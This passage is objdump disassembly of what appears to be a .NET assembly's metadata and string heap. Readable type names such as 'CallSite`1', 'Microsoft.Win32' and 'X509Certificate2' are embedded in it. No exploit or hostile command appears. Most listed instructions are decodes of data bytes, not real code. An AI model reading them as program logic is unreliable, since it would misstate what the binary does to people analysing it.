  406f06:	b0 17                	mov    $0x17,%al
  406f08:	1d 00 f1 02 f9       	sbb    $0xf902f100,%eax
  406f0d:	13 95 01 c1 03 95    	adc    -0x6afc3eff(%ebp),%edx
  406f13:	14 67                	adc    $0x67,%al
  406f15:	02 29                	add    (%ecx),%ch
  406f17:	03 44 0f 45          	add    0x45(%edi,%ecx,1),%eax
  406f1b:	07                   	pop    %es
  406f1c:	a9 02 56 0f 45       	test   $0x450f5602,%eax
  406f21:	07                   	pop    %es
  406f22:	a9 02 f9 13 95       	test   $0x9513f902,%eax
  406f27:	01 c9                	add    %ecx,%ecx
  406f29:	03 7a 22             	add    0x22(%edx),%edi
  406f2c:	4b                   	dec    %ebx
  406f2d:	07                   	pop    %es
  406f2e:	d1 03                	roll   $1,(%ebx)
  406f30:	7a 1d                	jp     0x406f4f
  406f32:	51                   	push   %ecx
  406f33:	07                   	pop    %es
  406f34:	d1 03                	roll   $1,(%ebx)
  406f36:	62 0e                	bound  %ecx,(%esi)
  406f38:	58                   	pop    %eax
  406f39:	07                   	pop    %es
  406f3a:	19 00                	sbb    %eax,(%eax)
  406f3c:	cc                   	int3
  406f3d:	0f 0e                	femms
  406f3f:	00 69 03             	add    %ch,0x3(%ecx)
  406f42:	7a 1d                	jp     0x406f61
  406f44:	84 01                	test   %al,(%ecx)
  406f46:	24 00                	and    $0x0,%al
  406f48:	7a 1d                	jp     0x406f67
  406f4a:	0e                   	push   %cs
  406f4b:	00 24 00             	add    %ah,(%eax,%eax,1)
  406f4e:	6b 0b 0f             	imul   $0xf,(%ebx),%ecx
  406f51:	05 24 00 b3 22       	add    $0x22b30024,%eax
  406f56:	3d 01 24 00 29       	cmp    $0x29002401,%eax
  406f5b:	25 77 07 c9 01       	and    $0x1c90777,%eax
  406f60:	ed                   	in     (%dx),%eax
  406f61:	18 7d 07             	sbb    %bh,0x7(%ebp)
  406f64:	89 00                	mov    %eax,(%eax)
  406f66:	09 20                	or     %esp,(%eax)
  406f68:	8d 07                	lea    (%edi),%eax
  406f6a:	89 00                	mov    %eax,(%eax)
  406f6c:	08 02                	or     %al,(%edx)
  406f6e:	93                   	xchg   %eax,%ebx
  406f6f:	07                   	pop    %es
  406f70:	91                   	xchg   %eax,%ecx
  406f71:	00 bd 0b 93 07 e1    	add    %bh,-0x1ef86cf5(%ebp)
  406f77:	03 17                	add    (%edi),%edx
  406f79:	26 99                	es cltd
  406f7b:	07                   	pop    %es
  406f7c:	99                   	cltd
  406f7d:	00 7a 1d             	add    %bh,0x1d(%edx)
  406f80:	a3 07 e9 03 cc       	mov    %eax,0xcc03e907
  406f85:	0f 0e                	femms
  406f87:	00 f1                	add    %dh,%cl
  406f89:	03 7a 1d             	add    0x1d(%edx),%edi
  406f8c:	49                   	dec    %ecx
  406f8d:	04 f9                	add    $0xf9,%al
  406f8f:	03 7a 13             	add    0x13(%edx),%edi
  406f92:	ab                   	stos   %eax,%es:(%edi)
  406f93:	07                   	pop    %es
  406f94:	81 00 6c 0d 0a 00    	addl   $0xa0d6c,(%eax)
  406f9a:	09 03                	or     %eax,(%ebx)
  406f9c:	4d                   	dec    %ebp
  406f9d:	25 87 06 09 03       	and    $0x3090687,%eax
  406fa2:	03 12                	add    (%edx),%edx
  406fa4:	b9 07 91 01 c3       	mov    $0xc3019107,%ecx
  406fa9:	0d 95 01 09 03       	or     $0x3090195,%eax
  406fae:	4d                   	dec    %ebp
  406faf:	25 c9 07 09 03       	and    $0x30907c9,%eax
  406fb4:	fa                   	cli
  406fb5:	11 ce                	adc    %ecx,%esi
  406fb7:	06                   	push   %es
  406fb8:	09 03                	or     %eax,(%ebx)
  406fba:	ee                   	out    %al,(%dx)
  406fbb:	11 53 01             	adc    %edx,0x1(%ebx)
  406fbe:	09 03                	or     %eax,(%ebx)
  406fc0:	5a                   	pop    %edx
  406fc1:	25 d0 07 09 03       	and    $0x30907d0,%eax
  406fc6:	b2 0d                	mov    $0xd,%dl
  406fc8:	53                   	push   %ebx
  406fc9:	01 99 03 23 23 eb    	add    %ebx,-0x14dcdcfd(%ecx)
  406fcf:	07                   	pop    %es
  406fd0:	0c 00                	or     $0x0,%al
  406fd2:	28 12                	sub    %dl,(%edx)
  406fd4:	01 08                	add    %ecx,(%eax)
  406fd6:	09 04 db             	or     %eax,(%ebx,%ebx,8)
  406fd9:	18 0b                	sbb    %cl,(%ebx)
  406fdb:	08 09                	or     %cl,(%ecx)
  406fdd:	04 66                	add    $0x66,%al
  406fdf:	0b 11                	or     (%ecx),%edx
  406fe1:	08 11                	or     %dl,(%ecx)
  406fe3:	04 a3                	add    $0xa3,%al
  406fe5:	0f 19 08             	nopl   (%eax)
  406fe8:	21 04 3f             	and    %eax,(%edi,%edi,1)
  406feb:	0d 20 08 19 04       	or     $0x4190820,%eax
  406ff0:	37                   	aaa
  406ff1:	0e                   	push   %cs
  406ff2:	27                   	daa
  406ff3:	08 31                	or     %dh,(%ecx)
  406ff5:	04 09                	add    $0x9,%al
  406ff7:	10 30                	adc    %dh,(%eax)
  406ff9:	08 41 04             	or     %al,0x4(%ecx)
  406ffc:	cb                   	lret
  406ffd:	1b 3a                	sbb    (%edx),%edi
  406fff:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407002:	09 10                	or     %edx,(%eax)
  407004:	6f                   	outsl  %ds:(%esi),(%dx)
  407005:	08 2c 00             	or     %ch,(%eax,%eax,1)
  407008:	58                   	pop    %eax
  407009:	21 7b 08             	and    %edi,0x8(%ebx)
  40700c:	34 00                	xor    $0x0,%al
  40700e:	cf                   	iret
  40700f:	0d 93 08 c9 01       	or     $0x1c90893,%eax
  407014:	55                   	push   %ebp
  407015:	26 84 00             	test   %al,%es:(%eax)
  407018:	61                   	popa
  407019:	04 7a                	add    $0x7a,%al
  40701b:	1d 53 01 59 04       	sbb    $0x4590153,%eax
  407020:	7a 1d                	jp     0x40703f
  407022:	b1 08                	mov    $0x8,%cl
  407024:	69 04 05 1f b9 08 51 	imul   $0xcd13db01,0x5108b91f(,%eax,1),%eax
  40702b:	01 db 13 cd 
  40702f:	00 89 04 7a 1d 53    	add    %cl,0x531d7a04(%ecx)
  407035:	01 71 04             	add    %esi,0x4(%ecx)
  407038:	7a 1d                	jp     0x407057
  40703a:	0e                   	push   %cs
  40703b:	00 91 04 ab 12 fa    	add    %dl,-0x5ed54fc(%ecx)
  407041:	02 91 04 48 12 fa    	add    -0x5edb7fc(%ecx),%dl
  407047:	02 91 04 4e 0d d2    	add    -0x2df2b1fc(%ecx),%dl
  40704d:	08 91 04 6e 13 d9    	or     %dl,-0x26ec91fc(%ecx)
  407053:	08 91 04 45 25 79    	or     %dl,0x79254504(%ecx)
  407059:	01 91 04 db 08 0e    	add    %edx,0xe08db04(%ecx)
  40705f:	00 91 04 9f 1d e0    	add    %dl,-0x1fe260fc(%ecx)
  407065:	08 79 04             	or     %bh,0x4(%ecx)
  407068:	7a 1d                	jp     0x407087
  40706a:	e6 08                	out    %al,$0x8
  40706c:	91                   	xchg   %eax,%ecx
  40706d:	04 cd                	add    $0xcd,%al
  40706f:	08 7f 01             	or     %bh,0x1(%edi)
  407072:	79 04                	jns    0x407078
  407074:	10 16                	adc    %dl,(%esi)
  407076:	0e                   	push   %cs
  407077:	00 81 04 7a 1d 79    	add    %al,0x791d7a04(%ecx)
  40707d:	01 59 02             	add    %ebx,0x2(%ecx)
  407080:	29 25 7f 01 b9 03    	sub    %esp,0x3b9017f
  407086:	78 14                	js     0x40709c
  407088:	f2 08 b9 04 7a 1d 53 	repnz or %bh,0x531d7a04(%ecx)
  40708f:	01 91 04 d4 08 79    	add    %edx,0x7908d404(%ecx)
  407095:	01 91 04 8f 1d e0    	add    %edx,-0x1fe270fc(%ecx)
  40709b:	08 c1                	or     %al,%cl
  40709d:	04 c0                	add    $0xc0,%al
  40709f:	25 16 09 c9 04       	and    $0x4c90916,%eax
  4070a4:	7a 1d                	jp     0x4070c3
  4070a6:	0e                   	push   %cs
  4070a7:	00 d1                	add    %dl,%cl
  4070a9:	04 7a                	add    $0x7a,%al
  4070ab:	1d 4f 09 08 00       	sbb    $0x8094f,%eax
  4070b0:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4070b1:	00 cd                	add    %cl,%ch
  4070b3:	01 08                	add    %ecx,(%eax)
  4070b5:	00 a8 00 d2 01 08    	add    %ch,0x801d200(%eax)
  4070bb:	00 ac 00 d7 01 08 00 	add    %ch,0x801d7(%eax,%eax,1)
  4070c2:	b0 00                	mov    $0x0,%al
  4070c4:	dc 01                	faddl  (%ecx)
  4070c6:	08 00                	or     %al,(%eax)
  4070c8:	b4 00                	mov    $0x0,%ah
  4070ca:	e1 01                	loope  0x4070cd
  4070cc:	08 00                	or     %al,(%eax)
  4070ce:	b8 00 e6 01 08       	mov    $0x801e600,%eax
  4070d3:	00 bc 00 eb 01 08 00 	add    %bh,0x801eb(%eax,%eax,1)
  4070da:	c0 00 f0             	rolb   $0xf0,(%eax)
  4070dd:	01 08                	add    %ecx,(%eax)
  4070df:	00 c4                	add    %al,%ah
  4070e1:	00 f5                	add    %dh,%ch
  4070e3:	01 08                	add    %ecx,(%eax)
  4070e5:	00 c8                	add    %cl,%al
  4070e7:	00 fa                	add    %bh,%dl
  4070e9:	01 08                	add    %ecx,(%eax)
  4070eb:	00 cc                	add    %cl,%ah
  4070ed:	00 ff                	add    %bh,%bh
  4070ef:	01 08                	add    %ecx,(%eax)
  4070f1:	00 d0                	add    %dl,%al
  4070f3:	00 04 02             	add    %al,(%edx,%eax,1)
  4070f6:	09 00                	or     %eax,(%eax)
  4070f8:	d8 00                	fadds  (%eax)
  4070fa:	8e 02                	mov    (%edx),%es
  4070fc:	09 00                	or     %eax,(%eax)
  4070fe:	dc 00                	faddl  (%eax)
  407100:	d7                   	xlat   %ds:(%ebx)
  407101:	01 09                	add    %ecx,(%ecx)
  407103:	00 e0                	add    %ah,%al
  407105:	00 d2                	add    %dl,%dl
  407107:	01 08                	add    %ecx,(%eax)
  407109:	00 f4                	add    %dh,%ah
  40710b:	00 cf                	add    %cl,%bh
  40710d:	02 08                	add    (%eax),%cl
  40710f:	00 f8                	add    %bh,%al
  407111:	00 d4                	add    %dl,%ah
  407113:	02 08                	add    (%eax),%cl
  407115:	00 fc                	add    %bh,%ah
  407117:	00 d9                	add    %bl,%cl
  407119:	02 08                	add    (%eax),%cl
  40711b:	00 00                	add    %al,(%eax)
  40711d:	01 cf                	add    %ecx,%edi
  40711f:	02 2e                	add    (%esi),%ch
  407121:	00 2b                	add    %ch,(%ebx)
  407123:	00 ff                	add    %bh,%bh
  407125:	02 2e                	add    (%esi),%ch
  407127:	00 33                	add    %dh,(%ebx)
  407129:	00 08                	add    %cl,(%eax)
  40712b:	03 2e                	add    (%esi),%ebp
  40712d:	00 3b                	add    %bh,(%ebx)
  40712f:	00 2d 03 2e 00 43    	add    %ch,0x43002e03
  407135:	00 36                	add    %dh,(%esi)
  407137:	03 2e                	add    (%esi),%ebp
  407139:	00 4b 00             	add    %cl,0x0(%ebx)
  40713c:	36 03 2e             	add    %ss:(%esi),%ebp
  40713f:	00 53 00             	add    %dl,0x0(%ebx)
  407142:	36 03 2e             	add    %ss:(%esi),%ebp
  407145:	00 5b 00             	add    %bl,0x0(%ebx)
  407148:	36 03 2e             	add    %ss:(%esi),%ebp
  40714b:	00 63 00             	add    %ah,0x0(%ebx)
  40714e:	36 03 2e             	add    %ss:(%esi),%ebp
  407151:	00 6b 00             	add    %ch,0x0(%ebx)
  407154:	36 03 2e             	add    %ss:(%esi),%ebp
  407157:	00 73 00             	add    %dh,0x0(%ebx)
  40715a:	36 03 2e             	add    %ss:(%esi),%ebp
  40715d:	00 7b 00             	add    %bh,0x0(%ebx)
  407160:	36 03 2e             	add    %ss:(%esi),%ebp
  407163:	00 83 00 3c 03 2e    	add    %al,0x2e033c00(%ebx)
  407169:	00 8b 00 49 03 c0    	add    %cl,-0x3ffcb700(%ebx)
  40716f:	00 93 00 d2 01 e0    	add    %dl,-0x1ffe2e00(%ebx)
  407175:	00 93 00 d2 01 e3    	add    %dl,-0x1cfe2e00(%ebx)
  40717b:	00 9b 00 af 03 00    	add    %bl,0x3af00(%ebx)
  407181:	01 93 00 d2 01 20    	add    %edx,0x2001d200(%ebx)
  407187:	01 93 00 d2 01 40    	add    %edx,0x4001d200(%ebx)
  40718d:	01 93 00 d2 01 60    	add    %edx,0x6001d200(%ebx)
  407193:	01 93 00 d2 01 80    	add    %edx,-0x7ffe2e00(%ebx)
  407199:	01 93 00 d2 01 a0    	add    %edx,-0x5ffe2e00(%ebx)
  40719f:	01 93 00 d2 01 c0    	add    %edx,-0x3ffe2e00(%ebx)
  4071a5:	01 93 00 d2 01 e0    	add    %edx,-0x1ffe2e00(%ebx)
  4071ab:	01 93 00 d2 01 00    	add    %edx,0x1d200(%ebx)
  4071b1:	02 93 00 d2 01 20    	add    0x2001d200(%ebx),%dl
  4071b7:	02 93 00 d2 01 40    	add    0x4001d200(%ebx),%dl
  4071bd:	02 93 00 d2 01 41    	add    0x4101d200(%ebx),%dl
  4071c3:	02 93 00 d2 01 60    	add    0x6001d200(%ebx),%dl
  4071c9:	02 93 00 d2 01 61    	add    0x6101d200(%ebx),%dl
  4071cf:	02 93 00 d2 01 80    	add    -0x7ffe2e00(%ebx),%dl
  4071d5:	02 93 00 d2 01 81    	add    -0x7efe2e00(%ebx),%dl
  4071db:	02 93 00 d2 01 a0    	add    -0x5ffe2e00(%ebx),%dl
  4071e1:	02 93 00 d2 01 a1    	add    -0x5efe2e00(%ebx),%dl
  4071e7:	02 93 00 d2 01 c0    	add    -0x3ffe2e00(%ebx),%dl
  4071ed:	02 93 00 d2 01 c1    	add    -0x3efe2e00(%ebx),%dl
  4071f3:	02 93 00 d2 01 e0    	add    -0x1ffe2e00(%ebx),%dl
  4071f9:	02 93 00 d2 01 e1    	add    -0x1efe2e00(%ebx),%dl
  4071ff:	02 93 00 d2 01 e3    	add    -0x1cfe2e00(%ebx),%dl
  407205:	02 93 00 d2 01 00    	add    0x1d200(%ebx),%dl
  40720b:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  407211:	03 93 00 d2 01 21    	add    0x2101d200(%ebx),%edx
  407217:	03 93 00 d2 01 41    	add    0x4101d200(%ebx),%edx
  40721d:	03 93 00 d2 01 61    	add    0x6101d200(%ebx),%edx
  407223:	03 93 00 d2 01 63    	add    0x6301d200(%ebx),%edx
  407229:	03 93 00 d2 01 01    	add    0x101d200(%ebx),%edx
  40722f:	00 06                	add    %al,(%esi)
  407231:	00 00                	add    %al,(%eax)
  407233:	00 1c 00             	add    %bl,(%eax,%eax,1)
  407236:	01 00                	add    %eax,(%eax)
  407238:	20 00                	and    %al,(%eax)
  40723a:	00 00                	add    %al,(%eax)
  40723c:	1d 00 b9 03 c8       	sbb    $0xc803b900,%eax
  407241:	03 f3                	add    %ebx,%esi
  407243:	03 8f 04 b5 04 df    	add    -0x20fb4afc(%edi),%ecx
  407249:	04 f6                	add    $0xf6,%al
  40724b:	04 0a                	add    $0xa,%al
  40724d:	05 15 05 3b 05       	add    $0x53b0515,%eax
  407252:	48                   	dec    %eax
  407253:	05 8d 05 9e 05       	add    $0x59e058d,%eax
  407258:	bc 05 d2 05 d8       	mov    $0xd805d205,%esp
  40725d:	05 0f 06 19 06       	add    $0x619060f,%eax
  407262:	1f                   	pop    %ds
  407263:	06                   	push   %es
  407264:	24 06                	and    $0x6,%al
  407266:	2a 06                	sub    (%esi),%al
  407268:	33 06                	xor    (%esi),%eax
  40726a:	40                   	inc    %eax
  40726b:	06                   	push   %es
  40726c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40726d:	06                   	push   %es
  40726e:	ab                   	stos   %eax,%es:(%edi)
  40726f:	06                   	push   %es
  407270:	d3 06                	roll   %cl,(%esi)
  407272:	dc 06                	faddl  (%esi)
  407274:	e1 06                	loope  0x40727c
  407276:	eb 06                	jmp    0x40727e
  407278:	16                   	push   %ss
  407279:	07                   	pop    %es
  40727a:	26 07                	es pop %es
  40727c:	38 07                	cmp    %al,(%edi)
  40727e:	5f                   	pop    %edi
  40727f:	07                   	pop    %es
  407280:	84 07                	test   %al,(%edi)
  407282:	b2 07                	mov    $0x7,%dl
  407284:	c2 07 d8             	ret    $0xd807
  407287:	07                   	pop    %es
  407288:	07                   	pop    %es
  407289:	08 ab 08 bf 08 fb    	or     %ch,-0x4f740f8(%ebx)
  40728f:	08 23                	or     %ah,(%ebx)
  407291:	09 28                	or     %ebp,(%eax)
  407293:	09 37                	or     %esi,(%edi)
  407295:	09 3f                	or     %edi,(%edi)
  407297:	09 58 09             	or     %ebx,0x9(%eax)
  40729a:	04 00                	add    $0x0,%al
  40729c:	01 00                	add    %eax,(%eax)
  40729e:	06                   	push   %es
  40729f:	00 0b                	add    %cl,(%ebx)
  4072a1:	00 07                	add    %al,(%edi)
  4072a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4072a6:	08 00                	or     %al,(%eax)
  4072a8:	0e                   	push   %cs
  4072a9:	00 00                	add    %al,(%eax)
  4072ab:	00 67 06             	add    %ah,0x6(%edi)
  4072ae:	9f                   	lahf
  4072af:	00 00                	add    %al,(%eax)
  4072b1:	00 6b 08             	add    %ch,0x8(%ebx)
  4072b4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072b5:	00 00                	add    %al,(%eax)
  4072b7:	00 9a 03 a9 00 00    	add    %bl,0xa903(%edx)
  4072bd:	00 fc                	add    %bh,%ah
  4072bf:	00 ae 00 00 00 bd    	add    %ch,-0x43000000(%esi)
  4072c5:	02 ae 00 00 00 ac    	add    -0x54000000(%esi),%ch
  4072cb:	09 b2 00 00 00 1d    	or     %esi,0x1d000000(%edx)
  4072d1:	0d b7 00 00 00       	or     $0xb7,%eax
  4072d6:	85 1b                	test   %ebx,(%ebx)
  4072d8:	bb 00 00 00 56       	mov    $0x56000000,%ebx
  4072dd:	15 b2 00 00 00       	adc    $0xb2,%eax
  4072e2:	25 07 bf 00 00       	and    $0xbf07,%eax
  4072e7:	00 c8                	add    %cl,%al
  4072e9:	02 0c 01             	add    (%ecx,%eax,1),%cl
  4072ec:	00 00                	add    %al,(%eax)
  4072ee:	9b                   	fwait
  4072ef:	0a 41 01             	or     0x1(%ecx),%al
  4072f2:	00 00                	add    %al,(%eax)
  4072f4:	f3 23 47 01          	repz and 0x1(%edi),%eax
  4072f8:	00 00                	add    %al,(%eax)
  4072fa:	09 25 b7 01 00 00    	or     %esp,0x1b7
  407300:	fd                   	std
  407301:	19 bb 01 00 00 dc    	sbb    %edi,-0x23ffffff(%ebx)
  407307:	22 bf 01 00 00 30    	and    0x30000001(%edi),%bh
  40730d:	13 c3                	adc    %ebx,%eax
  40730f:	01 00                	add    %eax,(%eax)
  407311:	00 a1 23 c8 01 02    	add    %ah,0x201c823(%ecx)
  407317:	00 06                	add    %al,(%esi)
  407319:	00 03                	add    %al,(%ebx)
  40731b:	00 01                	add    %al,(%ecx)
  40731d:	00 07                	add    %al,(%edi)
  40731f:	00 03                	add    %al,(%ebx)
  407321:	00 02                	add    %al,(%edx)
  407323:	00 08                	add    %cl,(%eax)
  407325:	00 05 00 01 00 09    	add    %al,0x9000100
  40732b:	00 05 00 02 00 0a    	add    %al,0xa000200
  407331:	00 07                	add    %al,(%edi)
  407333:	00 01                	add    %al,(%ecx)
  407335:	00 0b                	add    %cl,(%ebx)
  407337:	00 07                	add    %al,(%edi)
  407339:	00 02                	add    %al,(%edx)
  40733b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40733e:	09 00                	or     %eax,(%eax)
  407340:	01 00                	add    %eax,(%eax)
  407342:	0d 00 09 00 02       	or     $0x2000900,%eax
  407347:	00 0e                	add    %cl,(%esi)
  407349:	00 0b                	add    %cl,(%ebx)
  40734b:	00 01                	add    %al,(%ecx)
  40734d:	00 0f                	add    %cl,(%edi)
  40734f:	00 0b                	add    %cl,(%ebx)
  407351:	00 02                	add    %al,(%edx)
  407353:	00 10                	add    %dl,(%eax)
  407355:	00 0d 00 01 00 11    	add    %cl,0x11000100
  40735b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407361:	00 0f                	add    %cl,(%edi)
  407363:	00 01                	add    %al,(%ecx)
  407365:	00 13                	add    %dl,(%ebx)
  407367:	00 0f                	add    %cl,(%edi)
  407369:	00 02                	add    %al,(%edx)
  40736b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40736e:	11 00                	adc    %eax,(%eax)
  407370:	02 00                	add    (%eax),%al
  407372:	15 00 13 00 01       	adc    $0x1001300,%eax
  407377:	00 16                	add    %dl,(%esi)
  407379:	00 13                	add    %dl,(%ebx)
  40737b:	00 02                	add    %al,(%edx)
  40737d:	00 17                	add    %dl,(%edi)
  40737f:	00 15 00 01 00 18    	add    %dl,0x18000100
  407385:	00 15 00 02 00 2e    	add    %dl,0x2e000200
  40738b:	00 17                	add    %dl,(%edi)
  40738d:	00 02                	add    %al,(%edx)
  40738f:	00 36                	add    %dh,(%esi)
  407391:	00 19                	add    %bl,(%ecx)
  407393:	00 02                	add    %al,(%edx)
  407395:	00 37                	add    %dh,(%edi)
  407397:	00 1b                	add    %bl,(%ebx)
  407399:	00 02                	add    %al,(%edx)
  40739b:	00 59 00             	add    %bl,0x0(%ecx)
  40739e:	1d 00 01 00 5a       	sbb    $0x5a000100,%eax
  4073a3:	00 1d 00 02 00 5b    	add    %bl,0x5b000200
  4073a9:	00 1f                	add    %bl,(%edi)
  4073ab:	00 01                	add    %al,(%ecx)
  4073ad:	00 5c 00 1f          	add    %bl,0x1f(%eax,%eax,1)
  4073b1:	00 02                	add    %al,(%edx)
  4073b3:	00 5d 00             	add    %bl,0x0(%ebp)
  4073b6:	21 00                	and    %eax,(%eax)
  4073b8:	01 00                	add    %eax,(%eax)
  4073ba:	5e                   	pop    %esi
  4073bb:	00 21                	add    %ah,(%ecx)
  4073bd:	00 02                	add    %al,(%edx)
  4073bf:	00 5f 00             	add    %bl,0x0(%edi)
  4073c2:	23 00                	and    (%eax),%eax
  4073c4:	02 00                	add    (%eax),%al
  4073c6:	60                   	pusha
  4073c7:	00 25 00 06 00 5c    	add    %ah,0x5c000600
  4073cd:	00 03                	add    %al,(%ebx)
  4073cf:	00 06                	add    %al,(%esi)
  4073d1:	00 5e 00             	add    %bl,0x0(%esi)
  4073d4:	05 00 06 00 60       	add    $0x60000600,%eax
  4073d9:	00 07                	add    %al,(%edi)
  4073db:	00 08                	add    %cl,(%eax)
  4073dd:	00 c2                	add    %al,%dl
  4073df:	00 09                	add    %cl,(%ecx)
  4073e1:	00 ec                	add    %ch,%ah
  4073e3:	16                   	push   %ss
  4073e4:	f9                   	stc
  4073e5:	16                   	push   %ss
  4073e6:	fd                   	std
  4073e7:	04 2e                	add    $0x2e,%al
  4073e9:	05 9b 05 71 07       	add    $0x771059b,%eax
  4073ee:	57                   	push   %edi
  4073ef:	08 7f 08             	or     %bh,0x8(%edi)
  4073f2:	00 01                	add    %al,(%ecx)
  4073f4:	f1                   	int1
  4073f5:	00 15 0e 01 00 41    	add    %dl,0x4100010e
  4073fb:	01 f3                	add    %esi,%ebx
  4073fd:	00 85 22 01 00 40    	add    %al,0x40000122(%ebp)
  407403:	01 0b                	add    %ecx,(%ebx)
  407405:	01 10                	add    %edx,(%eax)
  407407:	10 01                	adc    %al,(%ecx)
  407409:	00 40 01             	add    %al,0x1(%eax)
  40740c:	19 01                	sbb    %eax,(%ecx)
  40740e:	48                   	dec    %eax
  40740f:	16                   	push   %ss
  407410:	02 00                	add    (%eax),%al
  407412:	50                   	push   %eax
  407413:	20 00                	and    %al,(%eax)
  407415:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  407419:	20 00                	and    %al,(%eax)
  40741b:	00 45 00             	add    %al,0x0(%ebp)
  40741e:	04 80                	add    $0x80,%al
  407420:	00 00                	add    %al,(%eax)
  407422:	01 00                	add    %eax,(%eax)
	...
  407430:	96                   	xchg   %eax,%esi
  407431:	0a 00                	or     (%eax),%al
  407433:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40743e:	00 00                	add    %al,(%eax)
  407440:	01 00                	add    %eax,(%eax)
  407442:	8d 0a                	lea    (%edx),%ecx
  407444:	00 00                	add    %al,(%eax)
  407446:	00 00                	add    %al,(%eax)
  407448:	04 00                	add    $0x0,%al
	...
  407452:	00 00                	add    %al,(%eax)
  407454:	01 00                	add    %eax,(%eax)
  407456:	c4 17                	les    (%edi),%edx
  407458:	00 00                	add    %al,(%eax)
  40745a:	00 00                	add    %al,(%eax)
  40745c:	04 00                	add    $0x0,%al
	...
  407466:	00 00                	add    %al,(%eax)
  407468:	70 02                	jo     0x40746c
  40746a:	30 14 00             	xor    %dl,(%eax,%eax,1)
  40746d:	00 00                	add    %al,(%eax)
  40746f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40747a:	00 00                	add    %al,(%eax)
  40747c:	01 00                	add    %eax,(%eax)
  40747e:	c0 0f 00             	rorb   $0x0,(%edi)
  407481:	00 00                	add    %al,(%eax)
  407483:	00 0a                	add    %cl,(%edx)
	...
  40748d:	00 00                	add    %al,(%eax)
  40748f:	00 70 02             	add    %dh,0x2(%eax)
  407492:	df 0a                	fisttps (%edx)
  407494:	00 00                	add    %al,(%eax)
  407496:	00 00                	add    %al,(%eax)
  407498:	04 00                	add    $0x0,%al
	...
  4074a2:	00 00                	add    %al,(%eax)
  4074a4:	70 02                	jo     0x4074a8
  4074a6:	31 22                	xor    %esp,(%edx)
  4074a8:	00 00                	add    %al,(%eax)
  4074aa:	00 00                	add    %al,(%eax)
  4074ac:	04 00                	add    $0x0,%al
	...
  4074b6:	00 00                	add    %al,(%eax)
  4074b8:	01 00                	add    %eax,(%eax)
  4074ba:	a2 1f 00 00 00       	mov    %al,0x1f
  4074bf:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4074ca:	00 00                	add    %al,(%eax)
  4074cc:	70 02                	jo     0x4074d0
  4074ce:	36 1b 00             	sbb    %ss:(%eax),%eax
  4074d1:	00 00                	add    %al,(%eax)
  4074d3:	00 12                	add    %dl,(%edx)
  4074d5:	00 11                	add    %dl,(%ecx)
  4074d7:	00 17                	add    %dl,(%edi)
  4074d9:	00 16                	add    %dl,(%esi)
  4074db:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4074de:	1b 00                	sbb    (%eax),%eax
  4074e0:	1d 00 1b 00 79       	sbb    $0x79001b00,%eax
  4074e5:	01 03                	add    %eax,(%ebx)
  4074e7:	07                   	pop    %es
  4074e8:	7b 01                	jnp    0x4074eb
  4074ea:	03 07                	add    (%edi),%eax
  4074ec:	d7                   	xlat   %ds:(%ebx)
  4074ed:	01 fc                	add    %edi,%esp
  4074ef:	07                   	pop    %es
  4074f0:	00 41 63             	add    %al,0x63(%ecx)
  4074f3:	74 69                	je     0x40755e
  4074f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4074f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4074f7:	60                   	pusha
  4074f8:	31 30                	xor    %esi,(%eax)
  4074fa:	00 49 45             	add    %cl,0x45(%ecx)
  4074fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4074fe:	75 6d                	jne    0x40756d
  407500:	65 72 61             	gs jb  0x407564
  407503:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407507:	31 00                	xor    %eax,(%eax)
  407509:	43                   	inc    %ebx
  40750a:	61                   	popa
  40750b:	6c                   	insb   (%dx),%es:(%edi)
  40750c:	6c                   	insb   (%dx),%es:(%edi)
  40750d:	53                   	push   %ebx
  40750e:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407515:	69 
  407516:	73 74                	jae    0x40758c
  407518:	60                   	pusha
  407519:	31 00                	xor    %eax,(%eax)
  40751b:	4d                   	dec    %ebp
  40751c:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407523:	74 2e                	je     0x407553
  407525:	57                   	push   %edi
  407526:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40752d:	55                   	push   %ebp
  40752e:	49                   	dec    %ecx
  40752f:	6e                   	outsb  %ds:(%esi),(%dx)
  407530:	74 33                	je     0x407565
  407532:	32 00                	xor    (%eax),%al
  407534:	54                   	push   %esp
  407535:	6f                   	outsl  %ds:(%esi),(%dx)
  407536:	49                   	dec    %ecx
  407537:	6e                   	outsb  %ds:(%esi),(%dx)
  407538:	74 33                	je     0x40756d
  40753a:	32 00                	xor    (%eax),%al
  40753c:	58                   	pop    %eax
  40753d:	35 30 39 43 65       	xor    $0x65433930,%eax
  407542:	72 74                	jb     0x4075b8
  407544:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40754b:	32 00                	xor    (%eax),%al
  40754d:	54                   	push   %esp
  40754e:	6f                   	outsl  %ds:(%esi),(%dx)
  40754f:	55                   	push   %ebp
  407550:	49                   	dec    %ecx
  407551:	6e                   	outsb  %ds:(%esi),(%dx)
  407552:	74 36                	je     0x40758a
  407554:	34 00                	xor    $0x0,%al
  407556:	54                   	push   %esp
  407557:	6f                   	outsl  %ds:(%esi),(%dx)
  407558:	49                   	dec    %ecx
  407559:	6e                   	outsb  %ds:(%esi),(%dx)
  40755a:	74 36                	je     0x407592
  40755c:	34 00                	xor    $0x0,%al
  40755e:	54                   	push   %esp
  40755f:	6f                   	outsl  %ds:(%esi),(%dx)
  407560:	55                   	push   %ebp
  407561:	49                   	dec    %ecx
  407562:	6e                   	outsb  %ds:(%esi),(%dx)
  407563:	74 31                	je     0x407596
